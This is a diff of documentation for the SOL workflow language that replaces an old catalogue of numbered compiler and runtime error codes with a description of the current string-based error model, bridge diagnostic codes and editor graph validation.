@@ -1,1885 +1,361 @@
 # Error Reference
 
-> **Status:** Substantive (commit 4). Catalogue of every diagnostic
-> the SOL compiler and runtime currently emit, plus the tool-side
-> mismatches the documentation team has identified.
+> **Status:** Rebuilt against the canonical `openprem-sol-v2` crate (the
+> `sol/` crate). The previous version of this document catalogued a large
+> set of numbered codes (E0xxx parse, E1xxx semantic, E2xxx runtime, T90xx
+> tool) emitted by a type-checking compiler that no longer exists. That
+> compiler and its analyzer phase were deleted. The canonical crate has NO
+> error codes, NO source spans, and NO compile-time type checker. This
+> reference documents the error model that actually ships.
 
-The narrative companion to this catalogue is [chapter 15](./15-errors-and-diagnostics.md).
-
-## Notation
-
-- **`E0xxx`** — parse errors (lexer / parser).
-- **`E1xxx`** — semantic errors (analyzer).
-- **`E2xxx`** — runtime errors (VM).
-- **`T9xxx`** — tool-side mismatches; not part of the language.
-
-Codes are **provisional**. The current compiler does not emit
-numerical codes; the names exist so consumers (SolFlow, Sol Man)
-have a stable handle on each diagnostic until the compiler adopts
-a compatible scheme.
-
-Each entry shows:
-
-- *Severity / Category* — error/warning/note + parse/semantic/runtime/tool.
-- *Where it fires* — source citation in the compiler.
-- *Cause* — the rule that was violated.
-- *Bad example* — minimal source that triggers it.
-- *Diagnostic shape* — the text the compiler prints today.
-- *Fix* — the minimal change that resolves it.
-- *Fixture / Related chapter* — links into the manual.
+The narrative companion is [chapter 15](./15-errors-and-diagnostics.md).
 
 ---
 
-## Parse errors
+## The error model in one paragraph
 
-### E0001 — Empty initializer in `let`
+The canonical pipeline is source to `Lexer` to `Parser` to `Compiler` to
+`Vm`,
+tied together for a single workflow by `WorkflowExecutor`. Every fallible
+step returns `Result<_, String>`: a plain human readable message, with no
+code and no span. Type mismatches are not caught ahead of time; they
+surface at run time as a `Failed(String)` step result. The lexer never
+hard errors (unterminated strings and bad numbers fall back silently).
+The editor does not see these raw strings directly. It talks to the crate
+through the `compiler-wasm` bridge, which wraps each message in a stable
+JSON envelope and tags it with one of exactly five diagnostic codes. A
+separate, editor only layer (`src/graph/validate.ts`) runs structural
+checks on the visual graph and emits its own kebab-case codes; those are
+not compiler diagnostics.
 
-**Severity:** error · **Category:** parse
-**Where it fires:** `parser.rs:339, 749` — `expression()` is called
-after `=` and hits `Semi`, which is not a valid expression start.
+So there are three distinct error surfaces, documented in order below:
 
-**Cause:** A `let` declaration uses `=` but supplies no expression.
+1. **Language layer** (`sol/src/*`): raw `String` messages.
+2. **Bridge diagnostics** (`compiler-wasm/src/lib.rs`): five codes in a
+   JSON envelope, plus the runtime error views.
+3. **Editor structural validation** (`src/graph/validate.ts`): kebab-case
+   codes on the graph.
 
-**Bad example:**
+---
+
+## 1. Language layer: raw string errors (`sol/src/*`)
+
+These are the messages the crate itself produces. They are returned as the
+`Err` arm of a `Result<_, String>` and have no code or span. The bridge
+forwards their text into the `message` field of a diagnostic (section 2).
+The lists below are representative real messages taken from the crate, not
+an exhaustive enumeration.
+
+### Lexer (`sol/src/lexer.rs`)
+
+The lexer never hard errors. Unterminated strings and chars and malformed
+numbers fall back silently rather than producing a diagnostic, so there is
+no message to catalogue here. Anything wrong lexically shows up later as a
+parser message.
+
+### Parser (`sol/src/parser.rs`)
+
+The parser returns a `String` on the first construct it cannot accept.
+Representative messages:
+
+| Message | Triggered by |
+| --- | --- |
+| `expected {Token}, got {Token}` | a required token is missing (the generic `expect`) |
+| `unexpected top-level token {Token}` | a statement keyword where a top level item was expected |
+| `unexpected token {Token}` | a token that cannot start a primary expression |
+| `unexpected EOF` / `expected identifier, got EOF` | input ends mid construct |
+| `expected identifier, got {Token}` | a name was required (param, field, type) |
+| `expected string literal, got {Token}` | `workflow` / `emit` / `import "..."` without a string |
+| `expected type, got {Token}` | a type position holds a non type token |
+| `expected enum name before \`::\`` | `::` used without a preceding enum identifier |
+| `expected field name, got {Token}` | malformed struct literal / member access |
+| `invalid assignment target: {Expr}` | assigning to something that is not an identifier, `a.field`, or `a[i]` |
+| `unexpected block as statement` | a bare `{ ... }` block in statement position |
+| `could not extract expression` | internal parser recovery dead end |
+
+Example that triggers a parse error (the return arrow is `<-`, never `->`):
 
 ```sol
-let x: int = ;
-```
-
-**Diagnostic:**
-
-```
-not an expressionable token: Semi
-could not parse expression!
-```
-
-**Fix:** Supply an initializer (`let x: int = 0;`) or drop the
-`=` entirely (`let x: int;`).
-
-**Fixture:** `error_parse1.sol`
-**Related chapter:** [06 §6.1](./06-variables-and-scope.md)
-
----
-
-### E0002 — Missing semicolon on a statement
-
-**Severity:** error · **Category:** parse
-**Where it fires:** `parser.rs:342` (for `let`), `parser.rs:373`
-(for expression statements), `parser.rs:483` (for `return`),
-`parser.rs:284` (for `ext function`).
-
-**Cause:** A statement form expects a terminating `;` and finds
-something else.
-
-**Bad example:**
-
-```sol
-let x: int = 5
-return x;
-```
-
-**Diagnostic:**
-
-```
-expected semicolon at the end of a variable declaration
-```
-
-(or `expected semicolon to follow exprstmt`, `expected semicolon
-at the end of a return statement`, `expected semicolon after ext
-function declaration`).
-
-**Fix:** Add the `;`.
-
-**Fixture:** `error_parse2.sol`
-**Related chapter:** [03 §3.4](./03-syntax.md)
-
----
-
-### E0003 — Unknown declaration at top level
-
-**Severity:** error · **Category:** parse
-**Where it fires:** `parser.rs:189–192` — top-level dispatcher
-hits an unexpected first token.
-
-**Cause:** The first token of what should be a declaration is not
-one of `ext`, `function`, `let`, `struct`, `enum`, `import`.
-
-**Bad example:**
-
-```sol
-export fn foo() {}
-```
-
-**Diagnostic:**
-
-```
-unknown declaration: Ident("export")
-```
-
-**Fix:** Drop the `export` (SOL has no such keyword; every
-top-level function is implicitly visible to the host). Or use
-one of the legal top-level forms.
-
-**Fixture:** none in repo
-**Related chapter:** [03 §3.3, 03 §3.6](./03-syntax.md), [05](./05-functions.md), [12](./12-imports-and-controllers.md)
-
----
-
-### E0004 — Missing `function` after `ext`
-
-**Severity:** error · **Category:** parse
-**Where it fires:** `parser.rs:252` — `eat(TokenKind::Func, …)`.
-
-**Cause:** `ext` is followed by something other than `function`.
-
-**Bad example:**
-
-```sol
-ext fn foo() -> int;
-```
-
-**Diagnostic:**
-
-```
-expected `function` keyword after `ext`
-```
-
-**Fix:** Use `function`, not `fn` or another keyword.
-
-**Related chapter:** [05 §5.4](./05-functions.md)
-
----
-
-### E0005 — Missing brace, closed brace, or bracket
-
-**Severity:** error · **Category:** parse
-**Where it fires:** Multiple — `parser.rs:221, 239, 296, 313, 355, 399, 414, 433, 496, 514, 527, 555, 621, 681, 697, 723, 736`. Each call to `eat(...)` for a structural token raises one of these.
-
-**Cause:** A missing `(`, `)`, `[`, `]`, `{`, or `}`.
-
-**Diagnostic (varies):**
-
-```
-left curly brace is never closed
-expected `)` after tuple type
-expected right parenthesis after parameter list
-expected left parenthesis after function name
-expected `]` to close array index
-expected `{` after if statement declaration
-expected `}` to close struct declaration
-expected `]` to close an array initializer
-...
-```
-
-**Fix:** Balance the brackets / braces / parentheses.
-
----
-
-### E0006 — Array size must be an integer
-
-**Severity:** error · **Category:** parse
-**Where it fires:** `parser.rs:215`.
-
-**Cause:** The size in an `[N]T` array type is not an integer
-literal.
-
-**Bad example:**
-
-```sol
-let arr: [n]int = [1, 2, 3];     # n is an identifier, not an integer literal
-```
-
-**Diagnostic:**
-
-```
-only integers can be used to specify an array size
-```
-
-**Fix:** Use a literal (`[3]int`) or omit the size (`[]int`).
-
-**Related chapter:** [11 §11.1](./11-arrays.md)
-
----
-
-### E0007 — Invalid type in type position
-
-**Severity:** error · **Category:** parse
-**Where it fires:** `parser.rs:245`.
-
-**Cause:** A type position holds a token the parser can't begin a
-type with (not an identifier, not `[`, not `(`).
-
-**Diagnostic:**
-
-```
-`<TOKEN>` is not valid in a type specifier
-```
-
-**Fix:** Use a valid type form per chapter 04.
-
----
-
-### E0008 — Unrecognized character (lexer)
-
-**Severity:** error · **Category:** parse
-**Where it fires:** `lexer.rs:298`.
-
-**Cause:** A source character does not start any valid token. (The
-lexer otherwise tolerates almost everything via the trivia /
-identifier / number paths.)
-
-**Diagnostic:**
-
-```
-unrecognized character: '<C>'
-```
-
-**Fix:** Remove the offending character.
-
----
-
-## Semantic errors
-
-### E1001 — Variable not in scope
-
-**Severity:** error · **Category:** semantic
-**Where it fires:** `analyzer.rs:485–488` (read), `analyzer.rs:222–224` (assign).
-
-**Cause:** An identifier in expression position resolves to no
-visible binding.
-
-**Bad example:**
-
-```sol
-fn start() -> int {
-    let x: int = 5;
-    return undefined_var;
+# `->` lexes as two tokens (Minus, Gt) and fails to parse.
+fn double(x: int) -> int {
+    return x * 2;
 }
 ```
 
-**Diagnostic:**
-
-```
-variable `undefined_var` could not be found in the current scope
-```
-
-**Fix:** Declare the variable (`let undefined_var: int = …;`) or
-correct the spelling.
-
-**Fixture:** `error_semantic1.sol`
-**Related chapter:** [06 §6.3](./06-variables-and-scope.md)
-
----
-
-### E1002 — Redefinition of name (variable / parameter / function / struct / enum)
-
-**Severity:** error · **Category:** semantic
-**Where it fires:** `analyzer.rs:50–53`.
-
-**Cause:** A second binding in the same scope tries to use a name
-that's already bound there.
-
-**Bad example (duplicate `let`):**
+The fix is to write the canonical arrow:
 
 ```sol
-fn start() -> int {
-    let x: int = 5;
-    let x: int = 10;
-    return x;
+fn double(x: int) <- int {
+    return x * 2;
 }
 ```
 
-**Bad example (duplicate `function`):**
+### Compiler / codegen (`sol/src/compiler.rs`)
+
+The compiler walks the AST into a bytecode `Chunk`. It rejects a handful of
+constructs it cannot lower. Representative messages:
+
+| Message | Triggered by |
+| --- | --- |
+| `no workflow found in program` | compiling a program that declares no `workflow "..."` |
+| `index assignment not supported` | `a[i] = v;` (indexed assignment is not lowered) |
+| `complex target in assignment not supported` | an assignment target that is neither a plain name nor a simple field set |
+| `variable '{name}' not found for assignment` | assigning to a name that was never declared with `let` |
+
+Example that triggers `index assignment not supported`:
 
 ```sol
-fn foo() -> int { return 5; }
-fn foo() -> int { return 10; }
-```
-
-**Diagnostic:**
-
-```
-error: redefinition of `<name>`
-```
-
-**Fix:** Rename one of the duplicates. (Shadowing across **nested**
-scopes is fine; see chapter 06 §6.4.)
-
-**Fixtures:** `error_semantic2.sol`, `error_semantic3.sol`
-**Related chapters:** [05 §5.1](./05-functions.md), [06 §6.4](./06-variables-and-scope.md)
-
----
-
-### E1003 — Wrong condition type in `if` / `while`
-
-**Severity:** error · **Category:** semantic
-**Where it fires:** `analyzer.rs:174–176` (if), `analyzer.rs:190–192` (while).
-
-**Cause:** The condition expression is not of type `bool`.
-
-**Bad example:**
-
-```sol
-if 5 { print("nope"); }
-```
-
-**Diagnostic:**
-
-```
-condition of if statement must be of type `bool`, got Integer
-```
-
-(The same text — including "if statement" — also fires for
-`while`; this is a known imprecision in the message text.)
-
-**Fix:** Convert to a boolean comparison (`if 5 != 0 { … }`).
-
-**Related chapter:** [07 §7.1, 07 §7.2](./07-control-flow.md)
-
----
-
-### E1004 — `for-in` iterable must be an array
-
-**Severity:** error · **Category:** semantic
-**Where it fires:** `analyzer.rs:202–209`.
-
-**Cause:** The expression after `in` does not have an array type.
-
-**Bad example:**
-
-```sol
-for x in 5 { print(x); }
-```
-
-**Diagnostic:**
-
-```
-array in which for loop is iterating over must have the known type `Array`
-```
-
-**Fix:** Pass an array — e.g. `for x in [5] { … }`.
-
-**Related chapter:** [07 §7.3](./07-control-flow.md)
-
----
-
-### E1005 — Illegal return (outside any function body)
-
-**Severity:** error · **Category:** semantic
-**Where it fires:** `analyzer.rs:469–472`.
-
-**Cause:** A `return` appears outside any `function` body.
-
-**Bad example:**
-
-```sol
-return 5;
-fn start() {}
-```
-
-**Diagnostic:**
-
-```
-illegal return statement
-```
-
-**Fix:** Move the `return` inside a function body.
-
----
-
-### E1006 — Arithmetic on mismatched types
-
-**Severity:** error · **Category:** semantic
-**Where it fires:** `analyzer.rs:247–251`.
-
-**Cause:** `+`, `-`, `*`, `/` between two operands of different
-types.
-
-**Bad example:**
-
-```sol
-let n: int = 1;
-let f: float = 1.5;
-let r: int = n + f;
-```
-
-**Diagnostic:**
-
-```
-mismatched types in arithmetic: Integer + Float
-```
-
-**Fix:** Convert one operand explicitly (via an `ext function`,
-since SOL has no built-in casts).
-
-**Related chapter:** [04 §4.2.1, 04 §4.2.2](./04-types.md)
-
----
-
-### E1007 — Arithmetic on a non-numeric type
-
-**Severity:** error · **Category:** semantic
-**Where it fires:** `analyzer.rs:255–258`.
-
-**Cause:** `+`/`-`/`*`/`/` on operands that match but are neither
-`int` nor `float` (e.g. `bool`, `str`, `char`, struct, enum).
-
-**Diagnostic:**
-
-```
-arithmetic operation Plus not supported for type Bool
-```
-
-**Fix:** Use the right operator for the type, or restructure the
-program.
-
-**Related chapter:** [04](./04-types.md)
-
----
-
-### E1008 — Cannot compare mismatched types
-
-**Severity:** error · **Category:** semantic
-**Where it fires:** `analyzer.rs:265–270`.
-
-**Cause:** `==`, `!=`, `<`, `<=`, `>`, `>=` between two operands of
-different types.
-
-**Diagnostic:**
-
-```
-cannot compare mismatched types: Integer < Float
-```
-
-**Fix:** Convert one side or change the comparison.
-
----
-
-### E1009 — Logical op requires booleans
-
-**Severity:** error · **Category:** semantic
-**Where it fires:** `analyzer.rs:274–279`.
-
-**Cause:** `&&` or `||` with at least one non-`bool` operand.
-
-**Diagnostic:**
-
-```
-logical operation AmpAmp requires boolean operands
-```
-
-**Fix:** Convert each operand to `bool` via a comparison.
-
----
-
-### E1010 — Bitwise op requires integers
-
-**Severity:** error · **Category:** semantic
-**Where it fires:** `analyzer.rs:283–288`.
-
-**Cause:** `&`, `|`, `^`, `<<`, `>>` with at least one non-`int`
-operand.
-
-**Diagnostic:**
-
-```
-bitwise operation Caret requires integer operands
-```
-
-**Fix:** Use `int` operands.
-
----
-
-### E1011 — Cannot negate a non-number
-
-**Severity:** error · **Category:** semantic
-**Where it fires:** `analyzer.rs:309–314`.
-
-**Cause:** Unary `-` on something other than `int` or `float`.
-
-**Diagnostic:**
-
-```
-cannot negate a non number type: <expr>(<TYPE>)
-```
-
----
-
-### E1012 — `!` on the wrong type
-
-**Severity:** error · **Category:** semantic
-**Where it fires:** `analyzer.rs:317–323`.
-
-**Cause:** Unary `!` on a type other than `bool`, `int`, or `float`.
-The acceptance of `int`/`float` is unusually permissive; idiomatic
-SOL uses `!` only on `bool`.
-
-**Diagnostic:**
-
-```
-can't not this type: <expr>(<TYPE>)
-```
-
----
-
-### E1013 — `~` requires an integer
-
-**Severity:** error · **Category:** semantic
-**Where it fires:** `analyzer.rs:325–331`.
-
-**Cause:** Unary `~` on a non-`int` operand.
-
-**Diagnostic:**
-
-```
-cannot bitwise invert a non integer type
-```
-
----
-
-### E1014 — Cannot assign mismatched types
-
-**Severity:** error · **Category:** semantic
-**Where it fires:** `analyzer.rs:291–296`.
-
-**Cause:** `target = expr` where `target` and `expr` have
-different types.
-
-**Diagnostic:**
-
-```
-cannot assign mismatched types: Integer = String
-<lhs-debug-print> = <rhs-debug-print>
-```
-
----
-
-### E1015 — Call to undefined function
-
-**Severity:** error · **Category:** semantic
-**Where it fires:** `analyzer.rs:376–379`.
-
-**Cause:** Call site refers to a name not registered as a function
-(neither `function` nor `ext function` nor a built-in).
-
-**Diagnostic:**
-
-```
-attempting to make a function call on an undefined name `<name>`
-```
-
-**Fix:** Declare the function or `ext function` (chapter 12 §12.1).
-
----
-
-### E1016 — Call on a non-function name
-
-**Severity:** error · **Category:** semantic
-**Where it fires:** `analyzer.rs:384–387`.
-
-**Cause:** The name resolves but is not a function (e.g. a struct
-name being "called").
-
-**Diagnostic:**
-
-```
-attempting to make a function call on a non-function type: `<name>`
-```
-
----
-
-### E1017 — Wrong argument count
-
-**Severity:** error · **Category:** semantic
-**Where it fires:** `analyzer.rs:391–394`.
-
-**Diagnostic:**
-
-```
-function `<name>` expects <N> arguments but received <M>
-```
-
----
-
-### E1018 — Wrong argument type
-
-**Severity:** error · **Category:** semantic
-**Where it fires:** `analyzer.rs:398–402`.
-
-**Diagnostic:**
-
-```
-function `<name>` expected <T> in position <i> but was passed <S>
-```
-
----
-
-### E1019 — Field access on a non-struct
-
-**Severity:** error · **Category:** semantic
-**Where it fires:** `analyzer.rs:411–413`.
-
-**Bad example:**
-
-```sol
-let a: []int = [1, 2, 3];
-print(a.length);            # arrays aren't structs; .length doesn't exist
-```
-
-**Diagnostic:**
-
-```
-<TYPE> is not a struct with members
-```
-
----
-
-### E1020 — Unknown struct in scope
-
-**Severity:** error · **Category:** semantic
-**Where it fires:** `analyzer.rs:417–419` (also fires for enum
-lookup in `analyzer.rs:438–441`; the text reuses "struct").
-
-**Diagnostic:**
-
-```
-could not find struct `<NAME>` in scope
-```
-
----
-
-### E1021 — Name resolved but not a struct
-
-**Severity:** error · **Category:** semantic
-**Where it fires:** `analyzer.rs:421–424`.
-
-**Diagnostic:**
-
-```
-`<NAME>` is not a struct
-```
-
----
-
-### E1022 — Field not on struct
-
-**Severity:** error · **Category:** semantic
-**Where it fires:** `analyzer.rs:426–429`.
-
-**Diagnostic:**
-
-```
-`<STRUCT>` has no member `<FIELD>`
-```
-
----
-
-### E1023 — Name resolved but not an enum
-
-**Severity:** error · **Category:** semantic
-**Where it fires:** `analyzer.rs:442–445`.
-
-**Diagnostic:**
-
-```
-`<NAME>` is not an enum
-```
-
----
-
-### E1024 — Variant not in enum
-
-**Severity:** error · **Category:** semantic
-**Where it fires:** `analyzer.rs:447–451`.
-
-**Diagnostic:**
-
-```
-`<NAME>` has no variant `<VAR>`
-```
-
----
-
-### E1025 — Array index of wrong type
-
-**Severity:** error · **Category:** semantic
-**Where it fires:** `analyzer.rs:459–461`.
-
-**Diagnostic:**
-
-```
-Type Error: Array index must be an integer or float
-```
-
-(The acceptance of `float` is almost certainly a typo; treat array
-indexes as `int`.)
-
----
-
-### E1026 — Indexing into a non-array
-
-**Severity:** error · **Category:** semantic
-**Where it fires:** `analyzer.rs:463–465`.
-
-**Diagnostic:**
-
-```
-Type Error: Cannot index into a non-array type
-```
-
----
-
-### E1027 — `rpc_request` wrong shape
-
-**Severity:** error · **Category:** semantic
-**Where it fires:** `analyzer.rs:346–363`.
-
-**Causes:** Argument count not equal to 2; first arg not `str`;
-second arg not an array.
-
-**Diagnostics:**
-
-```
-rpc_request expects 2 arguments, got <N>
-rpc_request: first argument must be str
-rpc_request: second argument must be an array
-```
-
----
-
-### E1028 — `rpc_response` wrong arity
-
-**Severity:** error · **Category:** semantic
-**Where it fires:** `analyzer.rs:367–372`.
-
-**Diagnostic:**
-
-```
-rpc_response expects 1 argument, got <N>
-```
-
----
-
-### E1029 — Unset assignment target
-
-**Severity:** error · **Category:** semantic
-**Where it fires:** `analyzer.rs:222–224, 235–238`.
-
-**Note:** The error text `variable <name> is assigned to before
-initialization` fires both when the LHS doesn't exist *and* when
-types don't match. The "before initialization" wording can be
-misleading; in many cases the real cause is a type mismatch
-(E1014). Read the surrounding context before trusting the
-literal text.
-
----
-
-### E1030 — `<token>` not a valid statement start
-
-**Severity:** error · **Category:** semantic / parse boundary
-**Where it fires:** `parser.rs:377–379` — statement dispatch
-fallthrough when neither a keyword nor an expression starts the
-position.
-
-**Diagnostic:**
-
-```
-identifier `<token>` is not the start of any known statement
-```
-
----
-
-## Runtime errors
-
-### E2001 — Integer division by zero
-
-**Severity:** error · **Category:** runtime
-**Where it fires:** `vm.rs:146` (`a / b` with `b == 0` on `i64`).
-
-**Cause:** A `/` operator on `int` operands evaluated with the RHS
-equal to zero.
-
-**Bad example:**
-
-```sol
-fn start() -> int {
-    return 1 / 0;
+workflow "demo" {
+    let xs: []int = [1, 2, 3];
+    xs[0] = 9;   # indexed assignment is not supported by codegen
 }
 ```
 
-**Diagnostic:**
-
-```
-thread '...' panicked at 'attempt to divide by zero', src/sol/vm.rs:146:...
-```
-
-**Fix:** Check the denominator with `if` before dividing.
-
-**Fixture:** `error_runtime.sol`
-**Related chapter:** [14 §14.4](./14-runtime-semantics.md)
-
----
-
-### E2002 — Array index out of bounds
-
-**Severity:** error · **Category:** runtime
-**Where it fires:** `vm.rs` `GetElem` / `SetElem` via
-`Vec::index`.
-
-**Diagnostic:**
-
-```
-thread '...' panicked at 'index out of bounds: the len is <N> but the index is <M>', ...
-```
-
-**Fix:** Range-check before indexing. Maintain a parallel length
-variable, or expose `len(arr)` via an `ext function`.
-
----
-
-### E2003 — Stack underflow
-
-**Severity:** error · **Category:** runtime
-**Where it fires:** `vm.rs:77` (`pop` on empty stack).
-
-**Diagnostic:**
-
-```
-Runtime Error: Stack underflow
-```
-
-This indicates a compiler bug — correctly-emitted bytecode should
-never underflow. Report against the compiler, not the program.
-
----
-
-## Tool-side mismatches
-
-### T9001 — Editor emits `// @trigger` annotations
-
-**Category:** tool — SolFlow ↔ SOL canonical
-
-**Description:** SolFlow's emitter writes lines like
-`// @trigger webhook event="order.received"` ahead of the
-function header. The SOL parser tolerates these as line comments
-(`lexer.rs:311–317`). They are not part of canonical SOL.
-
-**Where it lives:** `src/emit/emit.ts:emitTriggerComment`.
-
-**Recommendation:** Treat the annotation as editor metadata, not
-language. Round-tripping a SOL file by hand will drop the
-annotation unless the tool preserves it separately.
-
----
-
-### T9002 — Enum variant values are a character hash, not the iota
-
-**Category:** tool — compiler-internal mismatch
-
-**Description:** The parser computes per-variant iota values
-(starting at 0 or the most recent `= N`), but the bytecode emitter
-ignores those and uses `first_char % 10` instead
-(`bytecode.rs:538–541`). At runtime, two variants that share a
-first character collide; two enum variant `= N` annotations are
-silently ignored.
-
-**Where it lives:** `bytecode.rs:538–541`.
-
-**Recommendation:** Until fixed in the compiler, make every variant
-within an enum start with a *different first character*; do not
-rely on `= N` annotations; do not assume variants of different
-enums have different runtime values.
-
-**Related chapter:** [10 §10.5](./10-enums.md)
-
----
-
-### T9003 — `print(a, b, …)` only prints the first argument
-
-**Category:** tool — compiler-internal mismatch
-
-**Description:** The analyzer accepts any number of arguments of
-any types for `print` (`analyzer.rs:340–345`). The bytecode emitter
-compiles only `args[0]` and dispatches a single `Print*` op based
-on its type (`bytecode.rs:425`). Arguments after the first are
-silently dropped.
-
-**Where it lives:** `bytecode.rs:423–432`.
-
-**Recommendation:** Use one argument per `print` call. To print
-multiple values, emit multiple statements.
-
-**Related chapter:** [13 §13.1](./13-builtins-and-stdlib.md)
-
----
-
-### T9004 — Compile failure of an `ext function` without endpoint
-
-**Category:** tool — host configuration
-
-**Description:** When a SOL source declares an `ext function` that
-isn't in the host's flattened `[ext]`-to-URL map, the bytecode
-emitter exits with `no endpoint configured for ext function <name>`
-(`bytecode.rs:457–460`). This is **intentional** — better to fail
-at compile time than at runtime — but it appears as a compiler
-error message rather than a configuration-layer message.
-
-**Recommendation:** When you see this, the fix is in the host's
-configuration, not in the SOL source. Verify the function name
-appears in `[ext]` and the node it belongs to appears in `[nodes]`.
-
-**Related chapter:** [12 §12.4](./12-imports-and-controllers.md)
-
----
-
-### T9005 — `ConcatStr` exists at the bytecode level but is unreachable from source
-
-**Category:** tool — compiler internal feature gap
-
-**Description:** The bytecode has an `Inst::ConcatStr` op
-(`bytecode.rs:682`), but the analyzer rejects `str + str`
-(`analyzer.rs:247–258` requires `int` or `float` operands). So
-the bytecode op is dead code from the user's perspective.
-
-**Recommendation:** Until the analyzer accepts `str + str`,
-concatenate via an `ext function`.
-
-**Related chapter:** [04 §4.2.4](./04-types.md)
-
----
-
-### T9006 — `TypeMismatch::ArraySize` is computed but never surfaced
-
-**Category:** tool — diagnostic-quality gap
-
-**Description:** The `type_eq` helper distinguishes
-`TypeMismatch::ArraySize` (sizes differ but inner type matches)
-from `TypeMismatch::Inequal` (generic mismatch). Every analyzer
-call site collapses both via `.is_err()` into the same generic
-diagnostic `cannot ... mismatched types`. The user therefore
-can't tell from the message that the size was the specific
-problem.
-
-**Where it lives:** `util.rs:1–14`; all `analyzer.rs` call sites
-that consult `type_eq`.
-
-**Recommendation:** A future analyzer should match on the
-`TypeMismatch` variant and emit a distinct "array size mismatch:
-`[3]int` vs `[5]int`" message for the size case.
-
-**Related chapter:** [04 §4.6](./04-types.md)
-
----
-
-### T9007 — Tuple type equality truncates to the shorter length
-
-**Category:** tool — compiler bug (latent)
-
-**Description:** `util.rs:17–23` compares tuple types with
-`types_lhs.iter().zip(types_rhs).any(|(l, r)| type_eq(l, r).is_err())`.
-`zip` truncates to the shorter iterator, so a difference in
-arity is silently ignored — `(int, int)` and `(int, int, int)`
-compare equal.
-
-**Where it lives:** `util.rs:17–23`.
-
-**Recommendation:** Add a `types_lhs.len() == types_rhs.len()`
-guard.
-
-**Latency:** Tuple types have no surface value form today; this
-bug is currently unreachable from user code but would become live
-the moment tuple literals land. Logged proactively.
-
-**Related chapter:** [04 §4.4, 04 §4.6](./04-types.md)
-
----
-
-### T9008 — Function type equality ignores return types
-
-**Category:** tool — compiler bug (latent)
-
-**Description:** `util.rs:24–32` compares function types only by
-matching the `Void`-ness flags of the two return types. If both
-returns are `Void` or both are non-`Void`, the actual return types
-are not compared. So `function() -> int` and `function() -> str`
-are considered equal because both have non-`Void` returns and
-zero params.
-
-**Where it lives:** `util.rs:24–32`. Also affected: the tuple
-zip-truncation (T9007) applies to params, so `function(int, int)`
-and `function(int, int, int)` would compare equal.
-
-**Recommendation:** Replace the void-flag dance with a direct
-`type_eq(*ret_lhs, *ret_rhs)` call, and add a param-arity guard.
-
-**Latency:** First-class function values don't exist in SOL
-today; this bug is unreachable from user code but would become
-live if function types were ever exchanged between sites.
-
-**Related chapter:** [04 §4.6](./04-types.md)
-
----
-
-### T9009 — Unknown primitive name silently treated as nominal type
-
-**Category:** tool — analyzer gap
-
-**Description:** `parser.rs:198–209` recognizes `int, float, str,
-char, bool` as primitive type names in type position; anything
-else becomes `Type::Ident(name)` — a nominal struct/enum
-reference. The analyzer **does not** check at the declaration
-site that the named type actually exists; the check only happens
-at use sites that walk into the type (e.g. field access).
-
-In practice: a typo like `string` for `str` is silently accepted
-in any struct field, function parameter, or `let` annotation.
-The fixture `largemini.sol` uses `name: string` and `name:
-string` in `struct Person`, which the bytecode emitter happily
-processes because it doesn't validate struct field types.
-
-**Where it lives:** `parser.rs:198–209`, `analyzer.rs:138–145`
-(`let` and `struct` decl paths skip value/field-type checks).
-
-**Recommendation:** Either special-case the common misspellings
-(`string` → `str`) with a helpful diagnostic, or run a full
-struct/enum resolution pass before analyzing function bodies.
-
-**Related chapter:** [04 §4.1](./04-types.md), [09 §9.1](./09-structs.md)
-
----
-
-### T9010 — Several VM ops silently no-op on type mismatch
-
-**Category:** tool — runtime soft-fail
-
-**Description:** Multiple VM instruction handlers do an
-`if let HeapObject::X(...) = ...` match and silently fall through
-when the heap reference is the wrong shape:
-
-- `Inst::GetField`, `Inst::SetField` (`vm.rs:198–212`) — expect
-  `HeapObject::Struct`
-- `Inst::GetElem`, `Inst::SetElem`, `Inst::NewArray` reads,
-  `Inst::ArrayLen` (`vm.rs:220–243`) — expect
-  `HeapObject::Array`
-- `Inst::ConcatStr`, `Inst::EqStr` (`vm.rs:245–261`) — expect
-  `HeapObject::String`
-
-When the match fails, **the expected push does not happen**, and
-subsequent instructions pop from a stack that's shorter than they
-expect, surfacing as `Runtime Error: Stack underflow` or wrong-
-value behavior later in the program.
-
-**Where it lives:** `vm.rs` per-op handlers above.
-
-**Recommendation:** Replace the silent fall-through with an
-explicit `panic!("Runtime Error: <op> expected <kind>")`. This
-fails loudly at the actual mistake instead of corrupting the
-stack and failing somewhere downstream.
-
-**Latency:** Should not arise in well-emitted bytecode. Can
-arise from compiler bugs, hand-written bytecode, or future
-features that introduce new `HeapObject` variants.
-
-**Related chapter:** [14 §14.6, 14 §14.7](./14-runtime-semantics.md)
-
----
-
-### T9011 — Void function `Ret` leaves `0` on the caller's stack
-
-**Category:** tool — runtime behavior worth knowing
-
-**Description:** `Inst::Ret` (`vm.rs:283–293`) unwinds the call
-frame and pushes `0` onto the caller's stack. The emitter
-appends `Inst::Ret` at the end of every function body
-(`bytecode.rs:414`), so:
-
-- A function declared without `-> T` (Void) always ends with
-  `Ret`. Callers see `0` pushed.
-- Even a `Void` function compiles to "leaves 0 on the caller's
-  stack".
-- The analyzer treats `Void` as a separate type with no surface
-  spelling — but at the VM level, a Void function call is
-  indistinguishable from "returns the integer 0".
-
-For `start` returning via a bare `return;` or by falling off the
-end, the host sees `0`. This is usually the desired exit code,
-but a `start` that finishes with a non-zero top-of-stack value
-might end up returning whatever was left there by the prior
-instruction.
-
-**Where it lives:** `vm.rs:283–293`, `bytecode.rs:414`.
-
-**Recommendation:** Behavior is consistent and predictable;
-just be aware. When designing a host that inspects `start`'s
-return value, treat Void-returning entries as returning `0`.
-
-**Related chapter:** [05 §5.3, 05 §5.6](./05-functions.md), [14 §14.10](./14-runtime-semantics.md)
-
----
-
-### T9012 — `ExtCall` transport: hand-rolled HTTP/1.1, no HTTPS, no timeout
-
-**Category:** tool — runtime limitation
-
-**Description:** The VM's `Inst::ExtCall` (`vm.rs:469–579`) opens
-a fresh TCP connection per call and writes a hand-formatted
-HTTP/1.1 request. The relevant limitations:
-
-- **HTTP only.** The runtime strips a leading `http://` and
-  assumes the rest is `host[:port]/path`. URLs starting with
-  `https://` are parsed incorrectly and either fail to connect or
-  hit the wrong destination.
-- **No timeout.** A hung endpoint hangs the SOL session.
-- **No HTTP status check.** A non-2xx response with a JSON body
-  is treated identically to a success.
-- **Default values on missing/wrong response shape.** A response
-  whose `data` field is missing or of the wrong JSON type
-  produces the declared return type's default value (0, 0.0,
-  false, "?", or stringified JSON) — *silently*.
-- **Panics on connect / write / JSON failures.** These propagate
-  out as uncaught Rust panics and terminate the session.
-
-**Where it lives:** `vm.rs:469–579`.
-
